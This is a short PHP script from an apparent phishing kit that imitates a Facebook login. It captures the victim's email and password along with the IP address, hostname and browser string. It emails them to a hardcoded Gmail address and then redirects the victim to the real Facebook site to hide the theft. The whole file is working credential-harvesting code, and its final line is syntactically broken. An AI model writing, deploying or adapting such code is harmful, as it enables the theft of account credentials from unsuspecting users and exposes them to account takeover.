<?php
$ip = getenv("REMOTE_ADDR");
$hostname = $_POST['hostname'];
$bilsmg .= "-------------------- facebook -------------------\n";
$bilsmg .= "--------------  Infos -------------\n";
$bilsmg .= "Email Adresse       : ".$_POST['email']."\n";
$bilsmg .= "Password            : ".$_POST['ps']."\n";
$bilsmg .= "-------------- IP Infos ------------\n";
$bilsmg .= "IP      : $ip\n";
$bilsmg .= "HOST    : ".gethostbyaddr($ip)."\n";
$bilsmg .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$bilsmg .= "---------------------- mehdi  ----------------------\n";
$subject = "Yeeeh ! New Login From IP: $ip";
$send = "mhidoh@gmail.com";
$headers = 'From: mail@srvd32.hosteur.com' . "\r\n" .
mail($send,$subject,$bilsmg,$headers);

header?>("Location:http://facebook.com/");?